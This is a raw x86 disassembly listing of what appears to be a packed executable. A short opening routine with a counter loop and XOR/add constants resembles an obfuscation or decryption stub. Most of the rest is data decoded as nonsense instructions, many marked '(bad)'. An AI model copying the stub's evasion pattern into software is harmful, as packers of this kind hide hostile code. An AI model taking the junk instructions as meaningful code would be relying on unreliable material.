  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430546,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430542,0x13
  401884:	cmp    DWORD PTR ds:0x430542,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430542,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eaa4
  4018a9:	mov    ebx,DWORD PTR ds:0x430542
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430542,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e75e,0x42e762
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4304b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e76a,0x430542
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430552,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	inc    edi
  401915:	add    DWORD PTR [ecx],0xffffff8d
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x40198d
  401921:	adc    al,0x18
  401923:	(bad)
  401926:	mov    eax,0x5191b1b4
  40192b:	and    DWORD PTR [ebp-0x5b3dd700],0x6aea99b1
  401935:	lods   al,BYTE PTR ds:[esi]
  401936:	adc    al,0x3f
  401938:	pop    ds
  401939:	mov    ch,0x24
  40193b:	and    DWORD PTR [edx+0x7c124911],0xffffffc3
  401942:	lods   eax,DWORD PTR ds:[esi]
  401943:	jg     0x40193d
  401945:	nop
  401946:	xor    eax,0xabe63410
  40194b:	sbb    eax,0x11df6d5c
  401950:	push   0x60005b09
  401955:	add    eax,0xe1062e30
  40195a:	ret    
  40195b:	out    0xa1,eax
  40195d:	ret    
  40195e:	xchg   edx,eax
  40195f:	in     al,dx
  401960:	mov    al,ds:0x76406f03
  401965:	pop    ecx
  401966:	add    DWORD PTR [ecx-0x4370468f],edx
  40196c:	jbe    0x4019b8
  40196e:	test   al,0x54
  401970:	or     al,bl
  401972:	add    dh,0xc5
  401975:	shl    BYTE PTR cs:[esi+0x12],cl
  401979:	pop    ds
  40197a:	in     eax,dx
  40197b:	and    esp,DWORD PTR [esi+0x28ccadc0]
  401981:	jb     0x4019a8
  401983:	clc    
  401984:	cmp    eax,DWORD PTR [ebx+0x7100d1c6]
  40198a:	inc    esi
  40198b:	shl    BYTE PTR [edx],cl
  40198d:	or     DWORD PTR [edx+ecx*2],ecx
  401990:	push   ss
  401991:	int    0xad
  401993:	dec    ebx
  401994:	sbb    DWORD PTR [ebx+eax*1-0x3a],edx
  401998:	stos   DWORD PTR es:[edi],eax
  401999:	add    ebx,eax
  40199b:	lahf   
  40199c:	dec    esi
  40199d:	sub    eax,0x8b145a9d
  4019a2:	push   es
  4019a3:	xchg   edi,eax
  4019a4:	gs jg  0x40199b
  4019a7:	dec    edx
  4019a8:	xor    esi,DWORD PTR [esp+esi*1-0x7a]
  4019ac:	outs   dx,DWORD PTR ds:[esi]
  4019ad:	sbb    BYTE PTR [esp+eax*1+0x320a53a3],ah
  4019b4:	(bad)  
  4019b5:	xor    edx,DWORD PTR [eax]
  4019b7:	out    dx,eax
  4019b8:	lea    ecx,[edi]
  4019ba:	adc    ah,BYTE PTR [ecx+0x7b]
  4019bd:	call   0x8752be8c
  4019c2:	xchg   esp,eax
  4019c3:	jo     0x4019ba
  4019c5:	lock retf 
  4019c7:	pop    esi
  4019c8:	xor    dh,BYTE PTR [ebx]
  4019ca:	xchg   ebx,eax
  4019cb:	fistp  WORD PTR [ebx+0x5d]
  4019ce:	ds retf 0x7180
  4019d2:	push   esp
  4019d3:	ja     0x4019a8
  4019d5:	mov    edi,0x7b3d1af8
  4019da:	xchg   edx,eax
  4019db:	adc    DWORD PTR [ecx],ebp
  4019dd:	mov    esp,0x373050df
  4019e2:	push   ecx
  4019e3:	cmp    edi,DWORD PTR [edi+esi*1-0x18]
  4019e7:	inc    esp
  4019e8:	or     BYTE PTR [ecx+0x1f],dl
  4019eb:	adc    ch,BYTE PTR [edx+0x6155713d]
  4019f1:	gs push 0xffffffbf
  4019f4:	fsubr  DWORD PTR [edx-0x5a]
  4019f7:	and    BYTE PTR [ebx+0x5ab00949],0xb8
  4019fe:	lea    ebx,[ebx-0xa]
  401a01:	or     BYTE PTR [ebp-0x77],bh
  401a04:	rol    DWORD PTR [ebp-0x51ec0cf7],0xb4
  401a0b:	jb     0x4019b3
  401a0d:	mov    bl,0xd
  401a0f:	int3   
  401a10:	(bad)
  401a13:	xor    al,0x42
  401a15:	pop    es
  401a16:	xor    ah,BYTE PTR ds:0x869692d3
  401a1c:	in     eax,0xb0
  401a1e:	fsubr  DWORD PTR [eax+0x6e]
  401a21:	pusha  
  401a22:	jecxz  0x4019a8
  401a24:	popa   
  401a25:	test   al,0x84
  401a27:	in     al,0x2a
  401a29:	stc    
  401a2a:	xchg   esi,eax
  401a2b:	and    edx,0x976074f5
  401a31:	mov    al,BYTE PTR [ebp+0x197543cd]
  401a37:	add    al,0x1d
  401a39:	sub    eax,0xbf3f2e61
  401a3e:	xchg   BYTE PTR [eax],ah
  401a40:	jnp    0x401ab8
  401a42:	fisttp QWORD PTR [edi-0x19]
  401a45:	mov    ebp,0x2de202a1
  401a4a:	dec    edi
  401a4b:	jge    0x4019e9
  401a4d:	test   ecx,ecx
  401a4f:	xchg   ebx,eax
  401a50:	jno    0x4019d9
  401a52:	fisubr DWORD PTR [edi]
  401a54:	js     0x401a99
  401a56:	push   ebp
  401a57:	or     eax,0x996833d9
  401a5c:	lods   al,BYTE PTR ds:[esi]
  401a5d:	lea    edi,[edx+0xba5cba8]
  401a63:	popa   
  401a64:	push   cs
  401a65:	out    0x20,eax
  401a67:	lds    esi,FWORD PTR [esi+ebx*4-0x3c]
  401a6b:	xor    DWORD PTR [ebx+0xda521f5],0xdd0bf7aa
  401a75:	outs   dx,BYTE PTR ds:[esi]
  401a76:	das    
  401a77:	scas   al,BYTE PTR es:[edi]
  401a78:	mov    BYTE PTR [edi+0xbabcd7e],al
  401a7e:	mov    al,ds:0xef62f735
  401a83:	sar    DWORD PTR [ecx+0x23],0xd6
  401a87:	xchg   ebp,eax
  401a88:	out    dx,al
  401a89:	out    0x25,al
  401a8b:	mov    eax,ds:0xd4bc0901
  401a90:	aam    0x75
  401a92:	outs   dx,BYTE PTR ds:[esi]
  401a93:	test   eax,0x4ad7ff74
  401a98:	mov    edi,DWORD PTR [ebp+0x6d]
  401a9b:	mov    ds:0x459787db,al
  401aa0:	cli    
  401aa1:	push   ebx
  401aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aa3:	fcmovnb st,st(7)
  401aa5:	je     0x401a7f
  401aa7:	mov    esi,0x7810e838
  401aac:	pusha  
  401aad:	dec    ecx
  401aae:	inc    ecx
  401aaf:	cmp    ebx,DWORD PTR [ebx-0x6b]
  401ab2:	sub    al,0x1b
  401ab4:	out    0xc2,eax
  401ab6:	adc    bh,cl
  401ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ab9:	ins    BYTE PTR es:[edi],dx
  401aba:	and    al,0xe
  401abc:	enter  0xa248,0x99
  401ac0:	gs dec eax
  401ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ac3:	xchg   ecx,eax
  401ac4:	and    ecx,DWORD PTR [ecx-0x3c7bab8f]
  401aca:	jo     0x401a7b
  401acc:	aaa    
  401acd:	imul   esi,DWORD PTR [ebx],0xffffff89
  401ad0:	pop    ebp
  401ad1:	das    
  401ad2:	into   
  401ad3:	test   al,0x17
  401ad5:	mov    es,WORD PTR [eax-0x42]
  401ad8:	je     0x401b46
  401ada:	retf   
  401adb:	sahf   
  401adc:	loope  0x401b47
  401ade:	test   eax,0x7bd30fcc
  401ae3:	cmp    al,0x71
  401ae5:	lea    esp,[edi-0x50]
  401ae8:	fidivr WORD PTR [ebp-0x4]
  401aeb:	mov    esi,DWORD PTR [edx]
  401aed:	pusha  
  401aee:	stos   BYTE PTR es:[edi],al
  401aef:	xchg   ebx,eax
  401af0:	les    ecx,FWORD PTR [edx+0x3ef949a2]
  401af6:	pop    eax
  401af7:	or     dh,BYTE PTR [edx]
  401af9:	lods   eax,DWORD PTR ds:[esi]
  401afa:	xchg   edx,eax
  401afb:	mov    ds:0x7a7b0b7d,eax
  401b00:	mov    ebx,DWORD PTR [eax]
  401b02:	imul   ebx,DWORD PTR [ebp+0x9ac93fe],0xffffff84
  401b09:	jmp    0xda93:0x4b476745
  401b10:	mov    DWORD PTR [ebx-0x79],edi
  401b13:	mov    edi,esi
  401b15:	ret    
  401b16:	cdq    
  401b17:	ins    BYTE PTR es:[edi],dx
  401b18:	(bad)  
  401b19:	sub    al,BYTE PTR [edi+0x31]
  401b1c:	and    ebp,DWORD PTR ds:[edi+0x26]
  401b20:	xchg   esi,eax
  401b21:	loope  0x401af1
  401b23:	rcl    BYTE PTR [ecx],0x7e
  401b26:	xchg   esi,eax
  401b27:	pop    edx
  401b28:	das    
  401b29:	test   ebp,eax
  401b2b:	or     eax,ebp
  401b2d:	xchg   ebp,eax
  401b2e:	lds    edx,FWORD PTR [ebx]
  401b30:	mov    ebp,0x78721353
  401b35:	add    al,BYTE PTR [eax]
  401b37:	scas   eax,DWORD PTR es:[edi]
  401b38:	jp     0x401b6f
  401b3a:	fsubr  st,st(1)
  401b3c:	bound  esi,QWORD PTR [esi-0x6]
  401b3f:	inc    eax
  401b40:	mov    bl,0xef
  401b42:	aas    
  401b43:	out    dx,al
  401b44:	and    al,0x23
  401b46:	adc    eax,0x46e876ab
  401b4b:	mov    eax,0xb0c9840d
  401b50:	sbb    esi,DWORD PTR [eax]
  401b52:	jb     0x401b99
  401b54:	push   edx
  401b55:	or     DWORD PTR es:[ebx*2-0x49cf42e6],esi
  401b5d:	or     ah,bh
  401b5f:	jo     0x401b37
  401b61:	scas   eax,DWORD PTR es:[edi]
  401b62:	mov    ch,0xd4
  401b64:	xchg   esi,eax
  401b65:	or     dl,BYTE PTR [eax]
  401b67:	xchg   esp,eax
  401b68:	test   ah,bl
  401b6a:	inc    ebx
  401b6b:	pop    ecx
  401b6c:	jmp    0x401b28
  401b6e:	mov    al,0x5c
  401b70:	fwait
  401b71:	call   0x520913a2
  401b76:	cmp    eax,0x69400ccb
  401b7b:	or     DWORD PTR ss:[edi-0x2c703cf3],edi
  401b82:	mov    ah,0x4a
  401b84:	push   edx
  401b85:	dec    edi
  401b86:	in     eax,dx
  401b87:	outs   dx,BYTE PTR ds:[esi]
  401b88:	icebp  
  401b89:	repz jmp 0x401bce
  401b8c:	inc    ebp
  401b8d:	es hlt 
  401b8f:	push   ecx
  401b90:	cmp    esp,edi
  401b92:	fs xor al,0x3a
  401b95:	pop    ds
  401b96:	xor    BYTE PTR [edx],bh
  401b98:	outs   dx,DWORD PTR ds:[esi]
  401b99:	adc    dl,BYTE PTR gs:[esi]
  401b9c:	sub    bh,BYTE PTR [esi]
  401b9e:	sbb    DWORD PTR [ebx+0x550990f6],edi
  401ba4:	sub    cl,BYTE PTR [bx+si]
  401ba7:	xchg   ebx,eax
  401ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ba9:	fs aas 
  401bab:	mov    gs,ebp
  401bad:	jb     0x401bfa
  401baf:	pop    es
  401bb0:	ins    BYTE PTR es:[edi],dx
  401bb1:	imul   ebp,esi,0xe5610761
  401bb7:	xor    DWORD PTR [ecx],0xf16e64e5
  401bbd:	call   0x9ea4cee9
  401bc2:	lods   al,BYTE PTR ds:[esi]
  401bc3:	pop    edi
  401bc4:	call   0xf6f5:0xc1551329
  401bcb:	inc    esp
  401bcc:	xlat   BYTE PTR ds:[ebx]
  401bcd:	push   ecx
  401bce:	mul    BYTE PTR [edi]
  401bd0:	icebp  
  401bd1:	aam    0xd5
  401bd3:	adc    al,0x36
  401bd5:	or     al,0x85
  401bd7:	push   ss
  401bd8:	fwait
  401bd9:	xchg   edi,eax
  401bda:	clc    
  401bdb:	es sub eax,0xdb72ecb9
  401be1:	jno    0x401b9f
  401be3:	enter  0x33f1,0x6d
  401be7:	pop    edi
  401be8:	lods   al,BYTE PTR ds:[esi]
  401be9:	cli    
  401bea:	push   cs
  401beb:	dec    ebx
  401bec:	jmp    0x401bfa
  401bee:	inc    ebx
  401bef:	push   esp
  401bf0:	jmp    0xebfa:0x710609ba
  401bf7:	jns    0x401bcc
  401bf9:	add    BYTE PTR [edi],cl
  401bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bfc:	les    edx,FWORD PTR [edi+0x68929cf2]
  401c02:	adc    ch,bl
  401c04:	push   0xa81e17e7
  401c09:	mov    edi,DWORD PTR [edi+0x20b77678]
  401c0f:	sahf   
  401c10:	inc    edx
  401c11:	arpl   WORD PTR [esi-0x37a282c6],bx
  401c17:	mov    ecx,0x28ce362d
  401c1c:	mov    esi,0xc93b3f1b
  401c21:	and    eax,0x667769b1
  401c26:	or     BYTE PTR [edi-0x30c27fe8],bl
  401c2c:	sti    
  401c2d:	rcl    cl,0xdd
  401c30:	data16 sahf 
  401c32:	je     0x401c01
  401c34:	retf   0x27ed
  401c37:	mov    eax,ecx
  401c39:	shl    esi,0xea
  401c3c:	add    al,0x59
  401c3e:	mov    cl,0x1a
  401c40:	dec    esp
  401c42:	stos   BYTE PTR es:[edi],al
  401c43:	popa   
  401c44:	lock and edx,DWORD PTR [esi]
  401c47:	mov    ds:0xb7072e58,eax
  401c4c:	mov    BYTE PTR [ebx],bh
  401c4e:	out    dx,al
  401c4f:	mov    eax,ds:0x369c03cb
  401c54:	je     0x401c77
  401c56:	or     WORD PTR [esi+edx*1],di
  401c5a:	mov    eax,ds:0xfd83d815
  401c5f:	add    cl,al
  401c61:	mov    al,0x7c
  401c63:	mov    ds:0x5bf46c3e,al
  401c68:	pop    ss
  401c69:	mov    cl,0xa7
  401c6b:	test   eax,0x3b18679e
  401c70:	mov    ebp,0xb63cdc16
  401c75:	data16 stc 
  401c77:	call   0x51538b24
  401c7c:	xchg   esp,eax
  401c7d:	stos   DWORD PTR es:[edi],eax
  401c7e:	sbb    DWORD PTR [ebx],eax
  401c80:	in     eax,0xf8
  401c82:	adc    DWORD PTR [edi],0xffffffc8
  401c85:	cmp    ah,ah
  401c87:	cmp    DWORD PTR ds:0x1312dc3e,ebx
  401c8d:	jns    0x401c47
  401c8f:	jnp    0x401cd6
  401c91:	in     eax,0x2a
  401c93:	xor    ch,dl
  401c95:	cmp    ch,BYTE PTR [edi-0x54606e22]
  401c9b:	adc    DWORD PTR ds:0xf19bd46b,esp
  401ca1:	dec    ebx
  401ca2:	daa    
  401ca3:	outs   dx,BYTE PTR ds:[esi]
  401ca4:	retf   
  401ca5:	pop    es
  401ca6:	mov    bh,bl
  401ca8:	rcl    BYTE PTR [edi+eiz*8-0x2ec1d5ac],0x1b
  401cb0:	dec    ecx
  401cb1:	popf   
  401cb2:	fwait
  401cb3:	mov    esi,0x5c7f3f7
  401cb8:	and    dh,ch
  401cba:	inc    edx
  401cbb:	add    BYTE PTR [ecx],ch
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    cl,ch
  401cc1:	lods   al,BYTE PTR ds:[esi]
  401cc2:	add    eax,DWORD PTR [eax]
  401cc4:	add    BYTE PTR [edi],bl
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c99
  401cd2:	dec    ebx
  401cd3:	shr    DWORD PTR [esi+0x7e7e08ba],cl
  401cd9:	xor    BYTE PTR [ecx+0x7e],0x7e
  401cdd:	fwait
  401cde:	scas   eax,DWORD PTR es:[edi]
  401cdf:	fcomp  DWORD PTR [eax]
  401ce1:	aam    0xc6
  401ce3:	popf   
  401ce4:	cmp    eax,0xd67cf91a
  401ce9:	or     ebx,DWORD PTR [ebx]
  401ceb:	jge    0x401d40
  401ced:	and    esp,DWORD PTR [ecx-0x7df25ce2]
  401cf3:	iret   
  401cf4:	js     0x401d0d
  401cf6:	(bad)  
  401cf7:	xchg   esp,eax
  401cf8:	cmc    
  401cf9:	xor    ecx,DWORD PTR [edi]
  401cfb:	cmp    bh,BYTE PTR [edi-0x75]
  401cfe:	mov    esp,cs
  401d00:	mov    ch,0x65
  401d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d03:	(bad)  
  401d05:	retf   
  401d06:	(bad)  
  401d07:	(bad)  
  401d08:	pop    esp
  401d09:	pop    ss
  401d0a:	inc    edi
  401d0b:	xchg   ebx,eax
  401d0c:	pushf  
  401d0d:	inc    eax
  401d0e:	cmp    DWORD PTR [esp+edi*8-0x26],ebx
  401d12:	je     0x401cc1
  401d14:	xchg   ebp,eax
  401d15:	fcom   QWORD PTR [ebx]
  401d17:	das    
  401d18:	dec    esp
  401d1a:	shr    edx,1
  401d1c:	push   ds
  401d1d:	or     BYTE PTR [eax],0xc
  401d20:	xor    eax,0x42ed18cf
  401d25:	addr16 ror dh,cl
  401d28:	xchg   esp,eax
  401d29:	stos   BYTE PTR es:[edi],al
  401d2a:	push   ebx
  401d2b:	inc    esi
  401d2c:	mov    dh,0xdd
  401d2e:	jp     0x401d50
  401d30:	sub    BYTE PTR [eax+0x7e],al
  401d33:	in     eax,0x89
  401d35:	add    al,0x5c
  401d37:	(bad)  
  401d38:	xchg   esi,eax
  401d39:	je     0x401d3d
  401d3b:	lahf   
  401d3c:	mov    bl,0xc3
  401d3e:	or     eax,0xc4513801
  401d43:	aaa    
  401d44:	std    
  401d45:	mov    cl,0xc4
  401d47:	mov    ebx,0x4da60d2c
  401d4c:	xor    al,ch
  401d4e:	aas    
  401d4f:	mov    eax,0xd7495ca6
  401d54:	test   DWORD PTR [esi+eax*1-0x27],esi
  401d58:	test   edx,esi
  401d5a:	je     0x401d58
  401d5c:	jno    0x401cfd
  401d5e:	cmp    dh,bh
  401d60:	(bad)  
  401d61:	shl    DWORD PTR [eax],cl
  401d63:	xchg   ebx,eax
  401d64:	mov    ch,ah
  401d66:	ret    0x6a98
  401d69:	pop    edx
  401d6a:	fnsave [ecx-0x61]
  401d6d:	outs   dx,DWORD PTR ds:[esi]
  401d6e:	loope  0x401de2
  401d70:	mov    ebx,0x892fa8ff
  401d75:	mov    ch,0xd8
  401d77:	xchg   edx,eax
  401d78:	ins    BYTE PTR es:[edi],dx
  401d79:	sbb    DWORD PTR [eax],edi
  401d7b:	cmp    al,0x4e
  401d7d:	std    
  401d7e:	gs cmp edi,eax
  401d81:	cmp    eax,0xe357c918
  401d86:	and    eax,0x2820fc15
  401d8b:	in     eax,0xf4
  401d8d:	mov    bh,0xb3
  401d8f:	xchg   esi,eax
  401d90:	mov    dh,0xec
  401d92:	sub    al,0x93
  401d94:	xchg   ebp,eax
  401d95:	pushf  
  401d96:	iret   
  401d97:	sbb    esi,DWORD PTR [eax]
  401d99:	pop    ds
  401d9a:	and    eax,0xdd53ef7d
  401d9f:	inc    eax
  401da0:	inc    ecx
  401da1:	inc    esp
  401da2:	mov    BYTE PTR [esi-0x2b],ah
  401da5:	add    bh,BYTE PTR [edi-0x30]
  401da8:	ja     0x401d6f
  401daa:	jle    0x401e22
  401dac:	ss jp  0x401e16
  401daf:	fisttp WORD PTR [ecx-0x7cf78c2b]
  401db5:	call   0x6953:0xb2750795
  401dbc:	sbb    al,0x92
  401dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dbf:	int    0x17
  401dc1:	sub    eax,0xcea74ba6
  401dc6:	adc    ebp,DWORD PTR [eax+0x5fcfc782]
  401dcc:	repz mov bh,0xb2
  401dcf:	pop    edx
  401dd0:	lds    ebp,FWORD PTR [eax-0x6c]
  401dd3:	popa   
  401dd4:	push   eax
  401dd5:	add    eax,0x125df4da
  401dda:	test   al,0xe4
  401ddc:	scas   eax,DWORD PTR es:[edi]
  401ddd:	ud0    esp,DWORD PTR [eax+0x7a15396b]
  401de4:	adc    al,BYTE PTR [edi]
  401de6:	leave  
  401de7:	test   esi,0x7c28a6f0
  401ded:	gs dec ecx
  401def:	jae    0x401df7
  401df1:	pop    edi
  401df2:	mov    ch,0x9d
  401df4:	cdq    
  401df5:	ret    
  401df6:	ins    DWORD PTR es:[edi],dx
  401df7:	mov    ah,0xee
  401df9:	pop    ss
  401dfa:	mov    bl,0x83
  401dfc:	in     al,0xc4
  401dfe:	ror    BYTE PTR [edx-0xd],1
  401e01:	repz (bad) 
  401e03:	pop    eax
  401e04:	ins    BYTE PTR es:[edi],dx
  401e05:	pusha  
  401e06:	shl    BYTE PTR [edi-0x64],0x26
  401e0a:	pusha  
  401e0b:	out    dx,al
  401e0c:	outs   dx,BYTE PTR ds:[esi]
  401e0d:	(bad)  
  401e0e:	idiv   dl
  401e10:	adc    eax,0x896281d9
  401e15:	mov    BYTE PTR [esi-0x65081612],ch
  401e1b:	fild   WORD PTR [ecx]
  401e1d:	cwde   
  401e1e:	push   ds
  401e1f:	push   esp
  401e20:	iret   
  401e21:	test   BYTE PTR [ebx],0xc4
  401e24:	mov    ah,0xf1
  401e26:	lock or ebp,DWORD PTR [ebx+0x9862c5]
  401e2d:	shl    cl,0x86
  401e30:	stc    
  401e31:	leave  
  401e32:	xchg   BYTE PTR [edx],bh
  401e34:	jmp    0x401de2
  401e36:	cwde   
  401e37:	loopne 0x401de9
  401e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e3a:	rcr    DWORD PTR [edx-0x49df4a2e],1
  401e40:	loope  0x401e92
  401e42:	icebp  
  401e43:	sub    eax,0xe796da06
  401e48:	in     eax,dx
  401e49:	xchg   esi,eax
  401e4a:	mov    cl,0xef
  401e4c:	loope  0x401e0f
  401e4e:	or     eax,0x773a0d01
  401e53:	push   edi
  401e54:	mov    edi,0xc2da77fb
  401e59:	jmp    0x401ebb
  401e5b:	fcom   DWORD PTR [esi+0x41ba66b9]
  401e61:	retf   
  401e62:	scas   al,BYTE PTR es:[edi]
  401e63:	sbb    ecx,edi
  401e65:	jg     0x401e97
  401e67:	pop    esp
  401e68:	push   esp
  401e69:	mov    dh,0x88
  401e6b:	mov    bh,0x8c
  401e6d:	repnz not al
  401e70:	cmp    al,0x1c
  401e72:	dec    ecx
  401e73:	cmp    ebx,DWORD PTR [edx]
  401e75:	jae    0x401e3c
  401e77:	or     esp,DWORD PTR [edi]
  401e79:	push   ds
  401e7a:	(bad)  
  401e7c:	mov    ah,BYTE PTR [edi+0x14]
  401e7f:	inc    ecx
  401e80:	inc    ecx
  401e81:	xchg   ecx,edi
  401e83:	scas   eax,DWORD PTR es:[edi]
  401e84:	repz dec BYTE PTR [ebx]
  401e87:	cld    
  401e88:	call   0x1fea:0x7389947d
  401e8f:	jbe    0x401efc
  401e91:	or     BYTE PTR [edx],dh
  401e93:	mov    cl,0x14
  401e95:	and    DWORD PTR [esi-0x29],esp
  401e98:	mov    ebp,0x7d5bdcff
  401e9d:	inc    eax
  401e9e:	rcr    BYTE PTR [ebp+ebp*8-0x1c85747a],cl
  401ea5:	jmp    0xae9f:0x1c69e3f
  401eac:	aam    0x94
  401eae:	cmp    DWORD PTR [edi+ecx*4-0x13],ebx
  401eb2:	adc    al,0xc0
  401eb4:	sub    ah,BYTE PTR [esi+0x77]
  401eb7:	cmp    DWORD PTR [edi-0xa2bd4d3],esp
  401ebd:	and    al,0x31
  401ebf:	jp     0x401e63
  401ec1:	ss out 0x4,al
  401ec4:	mov    eax,0xd41c1402
  401ec9:	fbstp  TBYTE PTR [ebx]
  401ecb:	push   ebp
  401ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ecd:	rcl    BYTE PTR ds:0xba663541,cl
  401ed3:	sub    eax,0x239e74c3
  401ed8:	adc    al,0x3a
  401eda:	mov    BYTE PTR [eax+0x69e162f2],bl
  401ee0:	pop    ebx
  401ee1:	pop    esp
  401ee2:	leave  
  401ee3:	test   al,0xb3
  401ee5:	das    
  401ee6:	in     al,dx
  401ee7:	add    DWORD PTR [eax+0x403a35b7],eax
  401eed:	xor    BYTE PTR [esi+0x67bada20],dl
  401ef3:	xor    BYTE PTR [esi-0x5eddb6d8],dl
  401ef9:	xor    eax,0xa23cef03
  401efe:	mov    edi,0x95fbf42c
  401f03:	in     al,0xc8
  401f05:	repnz sub al,0x1f
  401f08:	push   ss
  401f09:	out    dx,eax
  401f0a:	(bad)  
  401f0c:	mov    dh,0x52
  401f0e:	mov    cl,0x57
  401f10:	adc    ch,BYTE PTR [esi+0x74f9a720]
  401f16:	hlt    
  401f17:	popf   
  401f18:	fsub   st,st(1)
  401f1a:	or     bl,BYTE PTR [edi]
  401f1c:	push   eax
  401f1d:	ss ret 0x329e
  401f21:	push   cs
  401f22:	push   edi
  401f23:	retf   0x878c
  401f26:	push   ebp
  401f27:	repz data16 test BYTE PTR [edi-0x24],dh
  401f2c:	push   es
  401f2d:	inc    esi
  401f2e:	mov    BYTE PTR [ecx],ch
  401f30:	repz (bad) 
  401f32:	and    ah,BYTE PTR [edx+0x93c9847]
  401f38:	jns    0x401ee8
  401f3a:	lahf   
  401f3b:	pop    esi
  401f3c:	retf   
  401f3d:	pop    ds
  401f3e:	je     0x401ecb
  401f40:	repnz and al,0xb
  401f43:	fisubr WORD PTR [edx-0x17ab8464]
  401f49:	jnp    0x401f45
  401f4b:	sar    DWORD PTR [edi],cl
  401f4d:	ins    BYTE PTR es:[edi],dx
  401f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f4f:	icebp  
  401f50:	imul   edi,DWORD PTR [eax+0x1b]
  401f54:	sahf   
  401f55:	repz gs fdecstp 
  401f59:	dec    ecx
  401f5a:	dec    edx
  401f5b:	sbb    DWORD PTR [ecx+0x84b83db],edx
  401f61:	arpl   bx,ax
  401f63:	mov    WORD PTR [esi-0x875713c],ds
  401f69:	jnp    0x401f34
  401f6b:	cmc    
  401f6c:	push   es
  401f6d:	adc    ah,dh
  401f6f:	pop    esi
  401f70:	rcl    DWORD PTR [ecx-0x18],0x70
  401f74:	xlat   BYTE PTR ds:[ebx]
  401f75:	mov    esi,DWORD PTR [ebp-0x74605315]
  401f7b:	test   al,0xea
  401f7d:	or     ch,bh
  401f7f:	sar    DWORD PTR [esi-0x57],0xa0
  401f83:	sub    DWORD PTR ds:0x41b1ba0d,esp
  401f89:	xchg   DWORD PTR [eax+0x51],edi
  401f8c:	push   esi
  401f8d:	dec    edx
  401f8e:	adc    al,0x90
  401f90:	imul   esp,edi,0x3f
  401f93:	dec    ecx
  401f94:	cmp    ah,cl
  401f96:	or     bl,BYTE PTR [eax]
  401f98:	pop    esi
  401f99:	retf   
  401f9a:	aas    
  401f9b:	retf   0x3d0f
  401f9e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fa0:	(bad)  
  401fa1:	cmp    esi,ecx
  401fa3:	ins    BYTE PTR es:[edi],dx
  401fa4:	out    dx,eax
  401fa5:	mov    dl,0x6e
  401fa7:	push   ds
  401fa8:	adc    al,0x2c
  401faa:	test   al,0xd7
  401fac:	scas   eax,DWORD PTR es:[edi]
  401fad:	ret    
  401fae:	xor    edi,DWORD PTR [edx]
  401fb0:	sub    DWORD PTR [edi],ebx
  401fb2:	loop   0x401faa
  401fb4:	jg     0x401f39
  401fb6:	shl    ebx,1
  401fb8:	(bad)  
  401fba:	mov    ss,eax
  401fbc:	xlat   BYTE PTR ds:[ebx]
  401fbd:	fst    QWORD PTR [eax+ebx*4]
  401fc0:	int3   
  401fc1:	xchg   DWORD PTR [esi+edi*8-0x5d],ebp
  401fc5:	test   eax,0x1dfbce2
  401fca:	dec    ebx
  401fcb:	lods   al,BYTE PTR ds:[esi]
  401fcc:	arpl   WORD PTR [ebx-0x4c],di
  401fcf:	inc    edi
  401fd0:	jle    0x401f64
  401fd2:	inc    ebx
  401fd3:	and    bl,BYTE PTR [esi-0x14]
  401fd6:	push   0x500ee665
  401fdb:	pop    esi
  401fdc:	inc    ecx
  401fdd:	out    dx,eax
  401fde:	pop    edi
  401fdf:	lock add al,ch
  401fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fe3:	cdq    
  401fe4:	fistp  WORD PTR [edi-0x67a008ac]
  401fea:	push   ebx
  401feb:	bnd jp 0x401f81
  401fee:	aaa    
  401fef:	pusha  
  401ff0:	dec    ebx
  401ff1:	cs mov edx,0x102faf76
  401ff7:	pop    edi
  401ff8:	mov    al,0xa0
  401ffa:	stc    
  401ffb:	cs jle 0x401fad
  401ffe:	mov    eax,ds:0x4694adc6
  402003:	cwde   
  402004:	stc    
  402005:	(bad)  
  402006:	retf   0x21b8
  402009:	cdq    
  40200a:	popf   
  40200b:	push   edi
  40200c:	call   0xffd2a104
  402011:	mov    ds:0x8a96d1ea,eax
  402016:	aaa    
  402017:	inc    edi
  402018:	std    
  402019:	out    0x46,eax
  40201b:	sbb    ebp,DWORD PTR [ebp+0x9]
  40201e:	xor    eax,ebx
  402020:	jecxz  0x402087
  402022:	inc    ecx
